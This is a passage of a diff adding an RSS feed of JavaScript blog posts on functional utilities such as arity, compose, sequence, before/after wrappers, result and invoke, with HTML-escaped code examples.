+&lt;p&gt;The above function allows us to pass in an argument length and a function to proxy. It then returns to us an anonymous function with the correct number of arguments defined (&lt;code&gt;.length&lt;/code&gt; works!) and allows us to call the function and return the usual result. It doesn’t do anything to the arguments in the interim, it just tells the world how many arguments we are accepting.&lt;/p&gt;
+&lt;h2 id=&quot;the-other-arity-problem&quot;&gt;The Other Arity Problem&lt;/h2&gt;
+&lt;p&gt;So we’ve touched one of the arity problems, which is a expecting to read the correct arity from a function. The reverse arity problem is when a function is called with incorrect or overloaded arguments. Consider &lt;code&gt;parseInt&lt;/code&gt;, which accepts two arguments - a string and the radix.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;].map(&lt;span class=&quot;built_in&quot;&gt;parseInt&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; [1, NaN, NaN, NaN, NaN]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we’re having problems. To fix this we can make a utility function that limits the number of arguments passed through.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Force a function to accept a specific number of arguments.
+ *
+ * @param  {Number}   length
+ * @param  {Function} fn
+ * @return {Function}
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; nary = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(length, fn)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, length));
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If you’ve been reading, you would have just noticed that we introduced the original bug we’ve been trying to avoid. That is, we’re returning a new anonymous function without proxying the number of arguments through. Let’s quickly correct that with the function we just wrote.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * Force a function to accept a specific number of arguments.
+ *
+ * @param  {Number}   length
+ * @param  {Function} fn
+ * @return {Function}
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; nary = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(length, fn)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;comment&quot;&gt;// Uses the previous function to proxy the number of arguments.&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; arity(length, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, length));
+  });
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we can use this to fix our map error from earlier. We also have the added bonus of a correct argument representation.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;nary(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;parseInt&lt;/span&gt;).length; &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; 1&lt;/span&gt;
+
+[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;].map(nary(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;parseInt&lt;/span&gt;)); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; [1, 2, 3, 4, 5]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Composing Functions in JavaScript</title>
+      <link>http://www.armblog.pl/articles/compose-functions-javascript/</link>
+      <pubDate>Sun, 19 Jan 2014 00:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/compose-functions-javascript/</guid>
+      <author></author>
+      <description>&lt;p&gt;Composing multiple functions to create more complex ones is a common utility in any programming language. And the ability to construct functions in a way that is easily composable is a true talent, but it really shines with code maintenance and reuse. It’s not uncommon to find huge applications composed of many, much smaller functions. Inspired by this pattern of extremely modular functions, I’ve been slowly migrating my programming style to allow for more composable and reusable functions.&lt;/p&gt;
+&lt;p&gt;To compose functions together, we will need to accept a list of functions for it to be made up from. Let’s call the functions &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; and &lt;code&gt;c&lt;/code&gt;. Now that we have the list of functions, we need to call each of them with the result of the next function. In JavaScript, we would do this with &lt;code&gt;a(b(c(x)))&lt;/code&gt; - with &lt;code&gt;x&lt;/code&gt; being the starting value. However, it would be much more useful to have something a little more reusable than this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; compose = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fns = &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;;
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(result)&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = fns.length - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i--) {
+      result = fns[i].call(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, result);
+    }
+
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The above function iterates over the function list (our arguments) in reverse - the last function to pass in is executed first. Given a single value as the initial input, it’ll chain that value between every function call and return the final result. This allows us to do some really cool things.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; number = compose(&lt;span class=&quot;built_in&quot;&gt;Math&lt;/span&gt;.round, &lt;span class=&quot;built_in&quot;&gt;parseFloat&lt;/span&gt;);
+
+number(&lt;span class=&quot;string&quot;&gt;'72.5'&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;//=&amp;gt; 73&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;sequence&quot;&gt;Sequence&lt;/h2&gt;
+&lt;p&gt;Another utility I’ve seen about in some functional libraries is called &lt;a href=&quot;https://github.com/raganwald/allong.es#functional-composition&quot;&gt;sequence&lt;/a&gt;. It’s very similar to &lt;code&gt;compose&lt;/code&gt;, except the arguments are executed in reverse. For example:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; sequence = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fns = &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;;
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(result)&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; fns.length; i++) {
+      result = fns[i].call(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, result);
+    }
+
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, we should make a note of the almost identical function signature to &lt;code&gt;compose&lt;/code&gt;. Usually, seeing something like this should trigger a warning in your head to find some way to reuse previous functionality, instead of replicating it. In this example, we can reuse the &lt;code&gt;compose&lt;/code&gt; function to write the &lt;code&gt;sequence&lt;/code&gt; implementation.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; sequence = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; compose.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;).reverse());
+};
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>Wrapping JavaScript Functions</title>
+      <link>http://www.armblog.pl/articles/wrapping-javascript-functions/</link>
+      <pubDate>Mon, 13 Jan 2014 23:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/wrapping-javascript-functions/</guid>
+      <author></author>
+      <description>&lt;p&gt;In the modern age of web applications and development, it seems we are constantly adding side effects to every part of our applications - everything from analytics to event triggering. Unfortunately in a lot of cases, we tend to cram this functionality into function with the useful stuff. As programmers, this causes numerous issues down the line - especially when it comes to refactoring and code comprehensibility.&lt;/p&gt;
+&lt;p&gt;A simple way to keep this functionality apart from the core code is create a helpful utility function to manage it for you. And to keep our code readability, we shouldn’t allow anything advanced that can break our understanding of the original function. That means we don’t want to be able to alter the original function, but we can still trigger any side effects we need to inline with the original function.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; before = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(before, fn)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    before.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To use the function, we can pass any function in as the first argument and the original function we want to wrap as the second argument. For example, we could do &lt;code&gt;before(logger, add)&lt;/code&gt;. Even without seeing the &lt;code&gt;logger&lt;/code&gt; or &lt;code&gt;add&lt;/code&gt; functions, we can imagine what each do. And because we are passing all the arguments to the side effect function, we can do stuff with the information.&lt;/p&gt;
+&lt;p&gt;One thing I find myself doing is checking what arguments were passed to a certain function. To do this now, we can &lt;code&gt;before(console.log.bind(console), fn)&lt;/code&gt;. Now, let’s implement the reverse functionality.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; after = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn, after)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; result = fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);
+    after.call(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, result);
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is extremely similar to the first example. The main difference is that the first function passed in is the side effect, but now we have the side effect running after our wrapped function. Adapting the previous example, we can now do &lt;code&gt;after(add, logger)&lt;/code&gt; and the logger will execute after the result is computed with the same arguments.&lt;/p&gt;
+&lt;p&gt;One cool thing we could actually do, is to run argument validation in the &lt;code&gt;before&lt;/code&gt; function. Consider this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; validAdd = before(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;.length; i++) {
+    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;[i] !== &lt;span class=&quot;string&quot;&gt;'number'&lt;/span&gt;) {
+      &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;TypeError&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'Expected a number'&lt;/span&gt;);
+    }
+  }
+}, add);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can also put these two functions together and create a new utility. This one allows us to pass both a function before and after our core functionality. E.g. &lt;code&gt;around(logger, add, logger)&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; around = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(under, fn, over)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; before(under, after(fn, over));
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;allow-unlimited-before-and-after-functions&quot;&gt;Allow unlimited before and after functions&lt;/h2&gt;
+&lt;p&gt;We can also adapt the functions to accept a variable number of arguments as the &lt;code&gt;before&lt;/code&gt; and &lt;code&gt;after&lt;/code&gt; functions. However, we can’t do this to the &lt;code&gt;around&lt;/code&gt; utility since we wouldn’t know which argument is the core function.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; before = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;comment&quot;&gt;/* ...before, fn */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; fn     = &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;[&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;.length - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; before = __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; before.length; i++) {
+      before[i].apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);
+    }
+
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);
+  };
+};
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; after = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn &lt;span class=&quot;comment&quot;&gt;/*, ...after */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; after = __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; result = fn.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;);
+
+    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; after.length; i++) {
+      after.call(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, result);
+    }
+
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result;
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;advanced-wrapping-utility&quot;&gt;Advanced wrapping utility&lt;/h2&gt;
+&lt;p&gt;So far we’ve seen some function wrapping utilities that are purely for side effects. They have no capability to alter the main function arguments or change the function result. For something more advanced than trigger side-effects, we might to want to use something a little different.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; wrap = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(fn, wrap)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; wrap.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, [fn].concat(__slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;)));
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is actually pretty similar the &lt;code&gt;wrap&lt;/code&gt; function used in Prototype.js. It allows us to call a custom wrapper function with the original function and all the arguments. But, how do we even use this?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; addAndMultiplyBy2 = wrap(add, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(originalFn, a, b)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; * originalFn(a, b);
+});
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>JavaScript Result Utility</title>
+      <link>http://www.armblog.pl/articles/javascript-result-utility/</link>
+      <pubDate>Thu, 09 Jan 2014 17:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/javascript-result-utility/</guid>
+      <author></author>
+      <description>&lt;p&gt;In JavaScript, an objects property can hold any type of data, from strings to functions and even nested objects. Since an object can hold any type of potential data, some libraries implement a &lt;a href=&quot;http://underscorejs.org/#result&quot;&gt;result utility&lt;/a&gt; to check whether the property is function and instead return the functions return.&lt;/p&gt;
+&lt;p&gt;This functionality is rarely required in your regular JavaScript workflow and is usually reserved for third-party libraries where users can pass in ambiguous data types. A prominent example would be a templating library, where the template can render simple data types like strings and numbers. However, the template may also be capable of rendering ambiguous or dynamic data in the form of functions. To do this, we could abstract it to the following utility.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; result = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(obj, property)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; value = obj[property];
+
+  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; value === &lt;span class=&quot;string&quot;&gt;'function'&lt;/span&gt;) {
+    value = value.call(obj);
+  }
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; value;
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The above is a relatively simple utility, but hopefully you can now imagine some use casesyou can refactor and reuse a utility like this. However, consider a slightly different utility I’m going call &lt;code&gt;ambiguous&lt;/code&gt;. This utility is similar, albeit entirely incompatible, but works around some of the limitations I found when using the &lt;code&gt;result&lt;/code&gt; function.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; ambiguous = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(value &lt;span class=&quot;comment&quot;&gt;/*, ...args */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; value === &lt;span class=&quot;string&quot;&gt;'function'&lt;/span&gt;) {
+    value = value.apply(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;, __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;));
+  }
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; value;
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Personally, the &lt;code&gt;ambiguous&lt;/code&gt; utility is much more useful in the real world. Especially since it removes the static context limitation from the &lt;code&gt;result&lt;/code&gt; utility above. It also allows us to pass in optional arguments in the case that the value is a function. Just some food for thought.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>A JavaScript Invoke Function</title>
+      <link>http://www.armblog.pl/articles/javascript-invoke-function/</link>
+      <pubDate>Sat, 04 Jan 2014 21:00:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/javascript-invoke-function/</guid>
+      <author></author>
+      <description>&lt;p&gt;Under certain functional JavaScript toolbelts, we can find a utility that is used purely for invoking a method on a passed in object. The utility is a really simple snippet that can be used in a number of different circumstances.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; __slice = &lt;span class=&quot;built_in&quot;&gt;Array&lt;/span&gt;.prototype.slice;
+
+&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; invoke = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(method &lt;span class=&quot;comment&quot;&gt;/*, ...args */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; args = __slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);
+
+  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(obj &lt;span class=&quot;comment&quot;&gt;/*, ..args */&lt;/span&gt;)&lt;/span&gt; {&lt;/span&gt;
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; obj[method].apply(obj, args.concat(__slice.call(&lt;span class=&quot;built_in&quot;&gt;arguments&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)));
+  };
+};
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The most useful situation for a utility such as this is in combination with other functional utilities and iterators. Consider the case where we have an array of objects with identical methods. Not uncommon in a complex MVC application where you may be tracking child views. To remove every child view, we need to iterate over an array of views and call &lt;code&gt;remove&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; children = [&lt;span class=&quot;comment&quot;&gt;/* ... */&lt;/span&gt;];
+
+children.forEach(invoke(&lt;span class=&quot;string&quot;&gt;'remove'&lt;/span&gt;));
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    <item>
+      <title>The Tap Utility in JavaScript</title>
+      <link>http://www.armblog.pl/articles/javascript-tap-function/</link>
+      <pubDate>Sat, 04 Jan 2014 20:30:00 +0100</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/javascript-tap-function/</guid>
+      <author></author>
